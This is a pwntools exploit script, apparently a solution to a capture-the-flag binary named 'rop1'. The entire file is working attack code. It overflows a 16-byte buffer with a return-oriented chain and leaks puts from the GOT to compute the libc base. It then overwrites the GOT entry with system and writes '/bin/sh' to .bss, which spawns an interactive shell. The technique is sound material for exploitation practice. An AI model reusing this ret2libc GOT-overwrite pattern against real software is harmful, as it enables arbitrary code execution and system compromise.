from pwn import *

r = process('./rop1')
e = ELF('./rop1')
libc = ELF('/lib32/libc.so.6')

bss = p32(0x804c020)
system_off = libc.symbols['system']
puts_off = libc.symbols['puts']
puts_plt = e.plt['puts']
puts_got = e.got['puts']
read_plt = e.plt['read']

pr = p32(0x08049022)
pppr = p32(0x8049231) 

payload = b'A' *16
payload += p32(puts_plt)
payload += pr
payload += p32(puts_got)

payload += p32(read_plt)
payload += pppr
payload += p32(0)
payload += p32(puts_got)
payload += p32(4)

payload += p32(read_plt)
payload += pppr
payload += p32(0)
payload += bss
payload += p32(8)

payload += p32(puts_plt)
payload += pr
payload += bss

r.recvline()
r.send(payload)

puts_add = u32(r.recv()[:4])
system_add = p32(puts_add - puts_off + system_off)

r.send(system_add)
r.send(b'/bin/sh\x00')

r.interactive()

